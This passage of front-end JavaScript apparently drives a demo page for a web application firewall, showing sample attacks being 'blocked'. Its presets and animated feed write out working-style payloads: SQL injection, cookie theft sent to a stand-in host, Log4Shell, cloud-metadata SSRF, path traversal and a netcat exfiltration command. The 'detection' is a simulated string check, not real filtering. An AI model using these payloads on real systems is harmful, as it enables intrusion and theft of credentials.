  const p = document.getElementById('commandPalette');
  if (p) p.style.display = 'none';
}

function toggleCommandPalette() {
  const p = document.getElementById('commandPalette');
  if (p && p.style.display !== 'none') {
    closeCommandPalette();
  } else {
    openCommandPalette();
  }
}

function handleCmdkBackdrop(e) {
  closeCommandPalette();
}

/* ─── INTERACTIVE WAF RULE ENGINE SANDBOX ─────────────────────── */
const WAF_PRESETS = {
  sqli: {
    payload: "' UNION SELECT 1, username, password_hash FROM accounts WHERE '1'='1' --",
    rule: 'AEGIS-RULE-SQLI-092',
    cwe: 'CWE-89: SQL Injection',
    severity: 'CRITICAL (CVSS 9.8)',
    status: 'blocked',
    patch: 'AUTO-ENFORCED AT EDGE',
    text: 'BLOCKED — HTTP 403 FORBIDDEN'
  },
  xss: {
    payload: "<script>fetch('https://c2.sh/exfiltrate?token='+document.cookie)</script>",
    rule: 'AEGIS-RULE-XSS-104',
    cwe: 'CWE-79: Cross-Site Scripting',
    severity: 'HIGH (CVSS 8.2)',
    status: 'blocked',
    patch: 'VIRTUAL SANITIZATION ACTIVE',
    text: 'BLOCKED — HTTP 403 FORBIDDEN'
  },
  traversal: {
    payload: '../../../../../../etc/passwd%00.png',
    rule: 'AEGIS-RULE-PATH-041',
    cwe: 'CWE-22: Path Traversal',
    severity: 'HIGH (CVSS 7.5)',
    status: 'blocked',
    patch: 'DIRECTORY ESCAPE NORMALIZATION',
    text: 'BLOCKED — HTTP 403 FORBIDDEN'
  },
  log4j: {
    payload: '${jndi:ldap://malicious-c2.net:1389/Exploit}',
    rule: 'AEGIS-RULE-RCE-001',
    cwe: 'CWE-502: Remote Code Execution (Log4Shell)',
    severity: 'CRITICAL (CVSS 10.0)',
    status: 'blocked',
    patch: 'LOOKUP HEADER STRIPPED',
    text: 'BLOCKED — HTTP 403 FORBIDDEN'
  },
  ssrf: {
    payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    rule: 'AEGIS-RULE-SSRF-088',
    cwe: 'CWE-918: Server-Side Request Forgery',
    severity: 'CRITICAL (CVSS 9.1)',
    status: 'blocked',
    patch: 'EGRESS LINK-LOCAL BLOCKED',
    text: 'BLOCKED — HTTP 403 FORBIDDEN'
  },
  benign: {
    payload: 'GET /products/view?category=electronics&sort=price_asc HTTP/1.1',
    rule: 'AEGIS-RULE-INSPECTION-PASS',
    cwe: 'None (Clean Safe Traffic)',
    severity: 'NONE (CVSS 0.0)',
    status: 'allowed',
    patch: 'CLEARED BY WAF PIPELINE',
    text: 'PASSED — HTTP 200 OK (0.24ms)'
  }
};

function initWafSandbox() {}

function loadWafPreset(type) {
  document.querySelectorAll('.sk-waf-preset-row .sk-chip').forEach(c => c.classList.remove('active'));
  if (window.event && window.event.target) window.event.target.classList.add('active');

  const preset = WAF_PRESETS[type];
  if (!preset) return;

  const area = document.getElementById('wafPayloadInput');
  if (area) area.value = preset.payload;

  testWafPayload();
}

function testWafPayload() {
  const input = document.getElementById('wafPayloadInput');
  const val = (input ? input.value : '').trim();

  const isBenign = val.includes('benign') || val.startsWith('GET /products') || (!val.includes("'") && !val.includes('<') && !val.includes('..') && !val.includes('${') && !val.includes('169.254'));

  const latency = (0.22 + Math.random() * 0.18).toFixed(2);
  const panel = document.getElementById('wafResultPanel');
  const vEl   = document.getElementById('wafVerdict');
  const vText = document.getElementById('wafVerdictText');
  const vIcon = document.getElementById('wafVerdictIcon');
  const latEl = document.getElementById('wafLatency');
  const ruleEl = document.getElementById('wafRuleId');
  const cweEl  = document.getElementById('wafCwe');
  const sevEl  = document.getElementById('wafSeverity');
  const patchEl= document.getElementById('wafPatch');
  const rawEl  = document.getElementById('wafRawHeaders');

  if (latEl) latEl.textContent = `${latency} ms`;

  if (isBenign) {
    if (vEl) {
      vEl.className = 'sk-waf-verdict allowed';
    }
    if (vIcon) vIcon.textContent = '✓';
    if (vText) vText.textContent = 'PASSED — HTTP 200 OK';
    if (ruleEl) {
      ruleEl.textContent = 'AEGIS-RULE-INSPECTION-PASS';
      ruleEl.className = 'sk-waf-detail-val emerald';
    }
    if (cweEl) cweEl.textContent = 'None (Safe Clean Request)';
    if (sevEl) {
      sevEl.textContent = 'NONE (CVSS 0.0)';
      sevEl.className = 'sk-waf-detail-val emerald';
    }
    if (patchEl) patchEl.textContent = 'REQUEST FORWARDED TO BACKEND';
    if (rawEl) {
      rawEl.textContent = `HTTP/1.1 200 OK\nServer: AegisAppSec-Edge-WAF/2.4\nX-Aegis-Inspected: true\nX-Aegis-Latency: ${latency}ms\nContent-Type: application/json\n\n{"status": "success", "data": "Request cleared by Aegis WAF"}`;
    }
  } else {
    // Malicious match
    if (vEl) {
      vEl.className = 'sk-waf-verdict blocked';
    }
    if (vIcon) vIcon.textContent = '⛔';
    if (vText) vText.textContent = 'BLOCKED — HTTP 403 FORBIDDEN';

    let matchedRule = 'AEGIS-RULE-SQLI-092';
    let matchedCwe = 'CWE-89: SQL Injection';
    let matchedSev = 'CRITICAL (CVSS 9.8)';
    let matchedPatch = 'AUTO-ENFORCED AT EDGE';

    if (val.includes('<') || val.includes('script') || val.includes('onerror')) {
      matchedRule = 'AEGIS-RULE-XSS-104';
      matchedCwe = 'CWE-79: Cross-Site Scripting';
      matchedSev = 'HIGH (CVSS 8.2)';
      matchedPatch = 'VIRTUAL SANITIZATION ACTIVE';
    } else if (val.includes('..') || val.includes('/etc/')) {
      matchedRule = 'AEGIS-RULE-PATH-041';
      matchedCwe = 'CWE-22: Path Traversal';
      matchedSev = 'HIGH (CVSS 7.5)';
      matchedPatch = 'DIRECTORY ESCAPE NORMALIZATION';
    } else if (val.includes('${') || val.includes('jndi')) {
      matchedRule = 'AEGIS-RULE-RCE-001';
      matchedCwe = 'CWE-502: Remote Code Execution (Log4Shell)';
      matchedSev = 'CRITICAL (CVSS 10.0)';
      matchedPatch = 'LOOKUP HEADER STRIPPED';
    } else if (val.includes('169.254') || val.includes('metadata')) {
      matchedRule = 'AEGIS-RULE-SSRF-088';
      matchedCwe = 'CWE-918: Server-Side Request Forgery';
      matchedSev = 'CRITICAL (CVSS 9.1)';
      matchedPatch = 'EGRESS LINK-LOCAL BLOCKED';
    }

    if (ruleEl) {
      ruleEl.textContent = matchedRule;
      ruleEl.className = 'sk-waf-detail-val cyan';
    }
    if (cweEl) cweEl.textContent = matchedCwe;
    if (sevEl) {
      sevEl.textContent = matchedSev;
      sevEl.className = 'sk-waf-detail-val rose';
    }
    if (patchEl) patchEl.textContent = matchedPatch;
    if (rawEl) {
      rawEl.textContent = `HTTP/1.1 403 Forbidden\nServer: AegisAppSec-Edge-WAF/2.4\nX-Aegis-Blocked: true\nX-Aegis-Rule: ${matchedRule}\nX-Aegis-Latency: ${latency}ms\nContent-Type: application/json\n\n{"status": "blocked", "error": "Malicious payload intercepted by Aegis WAF virtual patch"}`;
    }
  }
}

/* ─── HERO TELEMETRY CYCLING FEED ─────────────────────────────── */
function initHeroTelemetryFeed() {
  const feed = document.getElementById('heroFeed');
  if (!feed) return;

  const additionalItems = [
    { type: 'COMMAND INJECTION', cls: 'sqli', stCls: 'blocked', stText: 'WAF BLOCKED · 0.2ms', payload: '; cat /etc/passwd | nc attacker.io 4444' },
    { type: 'BROKEN AUTH TOKEN', cls: 'ssrf', stCls: 'detected', stText: 'SESSION REVOKED', payload: 'POST /api/auth/refresh [Malformed JWT alg:none]' },
    { type: 'GRAPHQL INTROSPECTION', cls: 'waf', stCls: 'blocked', stText: 'BLOCKED BY SCHEMA GATE', payload: '{ __schema { types { name fields { name } } } }' },
    { type: 'PATH TRAVERSAL PROBE', cls: 'sqli', stCls: 'blocked', stText: 'FILTERED · 0.3ms', payload: 'GET /static/../../../../etc/shadow HTTP/1.1' }
  ];

  let idx = 0;
  setInterval(() => {
    const item = additionalItems[idx % additionalItems.length];
    idx++;

    const div = document.createElement('div');
    div.className = 'sk-feed-item';
    div.style.opacity = '0';
    div.style.transform = 'translateY(-10px)';
    div.style.transition = 'all 0.3s ease';
    div.innerHTML = `
      <div class="sk-feed-top">
        <span class="sk-feed-type ${item.cls}">${item.type}</span>
        <span class="sk-feed-status ${item.stCls}">${item.stText}</span>
      </div>
      <div class="sk-feed-payload">${item.payload}</div>
    `;

    feed.insertBefore(div, feed.firstChild);
    requestAnimationFrame(() => {
      div.style.opacity = '1';
      div.style.transform = 'translateY(0)';
    });

    if (feed.children.length > 4) {
      feed.removeChild(feed.lastChild);
    }
  }, 3500);
}

